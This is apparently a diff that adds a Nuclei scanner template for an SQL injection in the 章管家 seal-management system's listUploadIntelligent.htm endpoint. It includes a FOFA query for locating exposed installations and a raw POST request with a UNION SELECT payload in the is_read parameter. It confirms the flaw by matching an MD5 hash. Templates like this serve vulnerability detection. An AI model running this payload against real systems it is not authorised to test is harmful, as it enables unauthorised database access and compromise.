@@ -1,0 +1,38 @@
+id: zhangguanjia-listUploadIntelligent-sql
+
+info:
+  name: 章管家 listUploadIntelligent.htm SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="章管家登录-公章在外防私盖"
+    章管家 listUploadIntelligent.htm 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486326&idx=1&sn=25b1ca6857bb8d411e117ea9c7da3aa3&chksm=c267be45f510375323db22e9ec62e07e4eedb44e92eaab769cc599a8c53da62aa4cac4e537ea&token=661111678&lang=zh_CN#rd
+  tags: sql injection
+
+
+http:
+  - raw:
+      - |
+        POST /app/message/listUploadIntelligent.htm?token=dingtalk_token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: application/x-www-form-urlencoded
+
+        person_id=1&unit_id=1&pageNo=1&is_read=-1 union select MD5(123456),2,3,4,5,6,7,8,9,10,11,12 --
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e10adc3949ba59abbe56e057f20f883e'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
